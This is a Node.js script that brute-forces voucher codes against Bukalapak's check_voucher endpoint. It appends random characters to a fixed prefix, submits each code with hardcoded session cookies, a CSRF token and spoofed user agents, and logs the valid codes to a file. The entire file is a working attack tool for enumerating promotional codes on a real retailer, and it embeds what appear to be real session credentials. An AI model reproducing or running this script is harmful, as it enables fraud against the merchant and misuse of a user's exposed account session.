const rp = require('request-promise');
const random_ua = require('random-ua');
const randstr = require('randomstring');
const inquirer = require('inquirer');
const fs = require('fs');
//
const base = "BLMOII";
let length = 4;
//
async function check(code) {
	const option = {
		url: 'https://www.bukalapak.com/payment/purchases/check_voucher.json',
		method: 'POST',
		headers: {
			'Cookie': 'identity=b186a4ff0ae9f81fd1c2ec95a828a7ab; browser_id=00c19844b99528d046acb8aaf97779d3; _ga=GA1.2.1148022183.1480220271; session_id=4d7d3c6f552de2290a66d230ec05576d; _gid=GA1.2.2009545677.1538982515; _vwo_uuid_v2=D82E2E6385D1B5776F6A41C0DEF27AF1C|ef382c39667fe4bfc2d6a6a925346a5d; _gcl_au=1.1.1171405832.1538982516; __auc=d9bb6aa616652819ae04e7e0de1; scs=%7B%22t%22%3A1%7D; ins-gaSSId=6583e066-2f41-06a5-0f92-99f297fabff5_1538986124; ins-mig-done=1; spUID=153898253082923700a79e6.d051d8eb; user_credentials=0edaafe7b8b464fc93aef1a0a2b77d05da34877bd50beb6cca172c62ec25d01d39d83553b76e56629fc4bbc2b0620cdb77bcb541e1621a6693829dc23276e13f%3A%3A123046869%3A%3A2019-01-08T14%3A11%3A51%2B07%3A00; mp_51467a440ff602e0c13d513c36387ea8_mixpanel=%7B%22distinct_id%22%3A%20%2216652819b32585-00f68f8e8ca9f5-51693374-100200-16652819b34c6%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.co.id%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.co.id%22%2C%22__alias%22%3A%20%22219bkl%22%7D; G_ENABLED_IDPS=google; keyword_parent_id=; keyword_correlation_id=9wiu6qw2r; __asc=8f774a911665283ac7e015c06fa; _gat=1; _gat_UA-12425854-1=1; lskjfewjrh34ghj23brjh234=ZjY4M2JuNXV5ZUk5Z1hkR2FNaFJteDRYZldkZ0Y1d0dORWJlcndZVDU2MEY1Mjk2d2g5N0lnWXNydlZUbUJqaFdKNUNSS01IbUdzSDBiUGRWZ0VNYkdOQzRIbUhsMFZaemk2Z2lPaEtZZ1dsTXJTdnhnSHBhVGd2OW5XeUt0eVFLbUxHK2ZkY3pGSDBZWTNhdThQSURBVWZ6QVhSOXo0VGhxYWRBRHhlYk53dkhxR21DYU05K1pibjFUQXlHcGtldS8weUxFSDFOUzVVL3RmYlJDMk83OHJ6K3lCZkFMaXdxelFEQ2ZBd3ZDTkFXemZCT1FqQTJPVWF0VXRxZ1pwaUp4cFpYM3BlamtwZGV0VEJ1RnkraUUzY1BvTVhGMnowbTUvbktXMC9yb2Z3elBBb1JCaS91aGdMbmd2TFJocmR2c0FPNHZWZGlweWVlYnY1ZUFzWm5uVEkzUmlBcldieVlER1FBWXRBVVVzamFBdXBtdEFLQVVITHdPY0J3OS9yS3RPeGxDeVlnSjZrWVcyREpFU0h4U1U1Vlh5SlgwTGpPSVBNTWJKZ1o1Zz0tLXFRK2dFV3ZrbTlHOGNRRFhRMG9ibWc9PQ%3D%3D--8f88eaa17247cb3dd4e773028b100a72055b2f42; _td=4b6eb719-2c76-4dd2-96bf-d12f43c33e1f; insdrSV=4; total-cart-amount=1590000; current-currency=IDR',
			'X-NewRelic-ID': 'VQcDWF9ADgIJVVBQ',
			'Origin': 'https://www.bukalapak.com',
			'X-CSRF-Token': 'MrpGc6ReUQMT4+f0wZ3z46G05xHKlPyn8JvrfagIpyWVgs/WoU1wNAYFC3lmomuNbHRezxzrVNXBnI5VSiStSg==',
			'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			'User-Agent': await random_ua.generate(),
			'Content-Type': 'application/json',
			'Accept': '*/*',
			'Referer': 'https://www.bukalapak.com/payment/purchases/new?product_id=1565181556&product_sku_id=1566382756&seller_ids=%5B1712140%5D',
			'X-Requested-With': 'XMLHttpRequest'
		},
		body: '{"payment_invoice":{"transactions":[{"address":{"province":"","city":""},"amount":450000,"courier_cost":0,"insurance_cost":0,"agent_commission_amount":0,"courier":null,"seller_id":48197902,"retarget_discount_amount":0,"cart_item_ids":[2735899804]}],"payment_method":null,"voucher_amount":0},"payment_details":{"virtual_account_type":""},"voucher_code":"'+code+'"}',
	};
	const start = await rp(option);
	const json = JSON.parse(start);
	return Promise.resolve(json.message);
}

async function generateCode(base, length) {
	return Promise.resolve(base+""+randstr.generate({
		length: length,
		capitalization: 'uppercase'
	}));
}

async function start(base, length, berapakali) {
	for(let i = 0; i < berapakali; i++){
		const kodenya = await generateCode(base, length);
		const checking = await check(kodenya, length);
		if (checking == "Voucher hanya berlaku untuk transaksi di Aplikasi Android Bukalapak dan Aplikasi iOS Bukalapak") {
			fs.appendFileSync('live.txt', `${kodenya} [ ${checking} ]\n`);
		} else {
			fs.appendFileSync('die.txt', `${kodenya} [ ${checking} ]\n`);
		}
		console.log(i+`. ${kodenya} [ ${checking} ]`);
	}
}

console.log(`Bukalapak Voucher Extrap Based.`)

inquirer.prompt([
	{
		type:'input',
		message:'Berapa kali gan? :',
		name:'kalinya',
		validate: function(data) {
			data = data.match(/[0-9]/);
			if (data) return true;
			return 'Only numeric.';
		}
	}
]).then(answers => {
	start(base, length, answers.kalinya);
});
